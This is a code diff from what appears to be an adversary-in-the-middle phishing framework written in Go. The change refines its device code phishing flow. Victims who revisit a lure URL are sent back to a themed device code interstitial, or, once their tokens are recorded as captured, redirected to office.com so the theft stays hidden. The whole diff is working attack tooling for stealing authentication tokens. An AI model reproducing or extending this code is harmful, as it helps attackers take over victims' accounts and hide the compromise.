@@ -1250,25 +1250,40 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							ps.SessionId = sc.Value
 							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
 
-							// If revisiting a lure URL with an existing DCModeDirect session, re-redirect to interstitial
+							// If revisiting a lure URL with an existing device code session, handle appropriately
 							if l != nil {
-								if session, exists := p.sessions[ps.SessionId]; exists && session.DCMode == DCModeDirect {
-									dcTheme := ""
-									if session.PhishLure != nil {
-										dcTheme = session.PhishLure.DeviceCodeTheme
-									}
-									var interstitialURL string
-									if dcTheme != "" && dcTheme != "default" {
-										interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+								if session, exists := p.sessions[ps.SessionId]; exists && (session.DCMode == DCModeDirect || session.DCMode == DCModeAlways) {
+									if session.DCState == DCStateCaptured {
+										// Tokens already captured - redirect to final destination
+										redirectURL := session.RedirectURL
+										if redirectURL == "" {
+											redirectURL = "https://office.com"
+										}
+										log.Debug("[devicecode] revisit after capture, redirecting to: %s", redirectURL)
+										resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "")
+										resp.Header.Set("Location", redirectURL)
+										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+										resp.Header.Set("Pragma", "no-cache")
+										return req, resp
 									} else {
-										interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
+										// Session still active - redirect to device code interstitial
+										dcTheme := ""
+										if session.PhishLure != nil {
+											dcTheme = session.PhishLure.DeviceCodeTheme
+										}
+										var interstitialURL string
+										if dcTheme != "" && dcTheme != "default" {
+											interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+										} else {
+											interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
+										}
+										log.Debug("[devicecode] revisit detected (mode: %s, state: %s), re-redirecting to %s", session.DCMode, session.DCState, interstitialURL)
+										resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "Redirecting...")
+										resp.Header.Set("Location", interstitialURL)
+										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+										resp.Header.Set("Pragma", "no-cache")
+										return req, resp
 									}
-									log.Debug("[devicecode] revisit detected, re-redirecting to %s", interstitialURL)
-									resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "Redirecting...")
-									resp.Header.Set("Location", interstitialURL)
-									resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-									resp.Header.Set("Pragma", "no-cache")
-									return req, resp
 								}
 							}
 
